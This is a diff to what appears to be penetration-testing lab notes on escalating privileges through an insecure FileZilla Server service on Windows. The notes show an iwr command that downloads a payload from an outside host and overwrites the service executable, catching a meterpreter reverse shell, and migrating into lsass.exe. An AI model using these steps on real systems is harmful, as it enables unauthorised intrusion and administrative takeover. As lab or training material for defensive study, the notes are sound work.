@@ -128,7 +128,13 @@ Download and replace the original FileZilla Server.exe place (iwr is alias of In
 -------------------------------------------------------------
 C:> iwr -UseBasicParsing -Uri 'http://10.10.21.2/FileZilla Server.exe' -Outfile  "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
 
-Caputre with msfconsole > FileZilla Server.exe doesn't have an icon > Only restarting service in services.msc > Can have meterpreter shell.
+Caputre with msfconsole > FileZilla Server.exe doesn't have an icon > Only restarting FileZilla service in services.msc > Can have meterpreter shell.
+
+Even we got meterpreter shell and we got administrative access , shell is unstable. 
+So that Migrate to lsass.exe
+----------------------------
+
+meterpreter > migrate -N lsass.exe
 
 We got reverse shell from Unsecure FileZilla service because  > Owner  : BUILTIN\Administrators
 ________________________________________________________________________________________________________________________________________________________________________
